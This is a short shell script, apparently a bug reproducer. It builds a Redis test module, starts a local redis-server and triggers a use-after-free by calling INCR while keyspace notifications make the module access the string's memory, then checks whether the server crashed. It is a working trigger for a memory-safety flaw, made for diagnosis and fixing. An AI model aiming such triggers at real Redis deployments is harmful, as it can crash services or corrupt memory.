#!/bin/sh
# Reproduce UAF: module subscribed to REDISMODULE_NOTIFY_STRING calls RM_StringDMA
# synchronously from notifyKeyspaceEvent() fired inside incrDecrCommand(), which (post-intro)
# replies using addReplyLongLongFromStr(c,new) AFTER the notification, reading freed memory.
set -e
cd /work

# Build the test module (not prebuilt in the tree).
(cd tests/modules && make keyspace_events.so) >/tmp/modbuild.log 2>&1

PORT=7799
rm -f /tmp/redis_poc.log
./src/redis-server --port $PORT --daemonize no \
    --loadmodule "$(pwd)/tests/modules/keyspace_events.so" \
    --logfile /tmp/redis_poc.log &
SERVER_PID=$!

# wait for server to be ready
for i in $(seq 1 50); do
    if ./src/redis-cli -p $PORT ping >/dev/null 2>&1; then
        break
    fi
    sleep 0.2
done

./src/redis-cli -p $PORT config set maxmemory-policy allkeys-lru
./src/redis-cli -p $PORT config set maxmemory 1gb
./src/redis-cli -p $PORT config set notify-keyspace-events 'A$'
./src/redis-cli -p $PORT set x 999999999
./src/redis-cli -p $PORT incr x

sleep 1
echo "---PING---"
./src/redis-cli -p $PORT ping || echo "SERVER_DOWN"
echo "---LOG TAIL---"
tail -100 /tmp/redis_poc.log

kill -9 $SERVER_PID 2>/dev/null || true
wait 2>/dev/null || true
